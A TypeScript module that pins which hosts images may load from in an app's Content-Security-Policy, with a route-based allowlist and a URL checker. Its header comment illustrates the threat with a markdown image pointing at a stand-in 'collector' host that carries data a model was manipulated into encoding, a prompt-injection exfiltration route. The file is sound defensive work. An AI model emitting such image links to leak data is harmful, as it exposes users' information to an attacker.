/**
 * Where an <img> in Instinct may load from. ONE list, read by the CSP in
 * src/middleware.ts and by the renderers that decide whether to emit an image
 * at all, so the two can never disagree.
 *
 * WHY NOT `https:`. A CSP of `img-src https:` lets any page render an image
 * from any host, and an image URL is a request the browser makes with no click.
 * If model output ever reaches an image sink, `![x](https://collector/?d=...)`
 * sends whatever the model was talked into encoding there. Pinning the hosts
 * makes that request fail in the browser even if a renderer slips.
 *
 * WHAT THE APP ACTUALLY LOADS (grepped 2026-10-25): every product page uses
 * same-origin images (`/ogiam-logo.png`, `/api/.../screenshot`,
 * `/api/clients/[id]/assets/[assetId]/raw`), `data:` (QR codes, compressed
 * uploads) and `blob:` (local previews before upload). The Microsoft Graph
 * profile photo is never rendered as an <img> by the client. No `images`
 * block in next.config.ts.
 *
 * The site builder is the one exception: it previews a client's site, whose
 * images are generated (committed to the site repo, served from
 * raw.githubusercontent.com, or fal's CDN before the repo exists) or live on
 * the client's own Vercel deployment. Those hosts are allowed on the
 * site-builder routes only.
 */

/** Sources every page may load images from. */
export const APP_IMG_SOURCES: readonly string[] = Object.freeze(["'self'", "data:", "blob:"]);

/** Extra hosts the site-builder routes need for client-site imagery. */
export const SITE_BUILDER_IMG_HOSTS: readonly string[] = Object.freeze([
  "https://raw.githubusercontent.com",
  "https://fal.media",
  "https://*.fal.media",
  "https://*.vercel.app",
]);

/** Route prefixes that render a client site preview. */
const SITE_BUILDER_PREFIXES = ["/sites", "/share/"];

export function isSiteBuilderPath(pathname: string): boolean {
  return SITE_BUILDER_PREFIXES.some((p) =>
    p.endsWith("/") ? pathname.startsWith(p) : pathname === p || pathname.startsWith(`${p}/`),
  );
}

/** The `img-src` directive for a route. Never contains a bare `https:`. */
export function imgSrcDirective(pathname: string): string {
  const sources = isSiteBuilderPath(pathname)
    ? [...APP_IMG_SOURCES, ...SITE_BUILDER_IMG_HOSTS]
    : [...APP_IMG_SOURCES];
  return `img-src ${sources.join(" ")}`;
}

function hostMatches(host: string, pattern: string): boolean {
  const p = pattern.replace(/^https:\/\//, "");
  if (p.startsWith("*.")) return host.endsWith(p.slice(1)) && host.length > p.length - 1;
  return host === p;
}

/**
 * Whether an image URL would load on a site-builder page under the CSP.
 * Relative and same-origin URLs, `data:` images and `blob:` are fine; an
 * absolute URL must be https and on SITE_BUILDER_IMG_HOSTS. Renderers use this
 * to skip an image the browser would refuse anyway, so a blocked host shows as
 * "no image" rather than a broken one and a CSP violation.
 */
export function isAllowedSiteImageSrc(src: string | null | undefined): boolean {
  if (!src) return false;
  const s = src.trim();
  if (s.startsWith("/") && !s.startsWith("//")) return true;
  if (/^data:image\//i.test(s) || /^blob:/i.test(s)) return true;
  let u: URL;
  try {
    u = new URL(s);
  } catch {
    return false;
  }
  if (u.protocol !== "https:") return false;
  return SITE_BUILDER_IMG_HOSTS.some((h) => hostMatches(u.hostname.toLowerCase(), h));
}
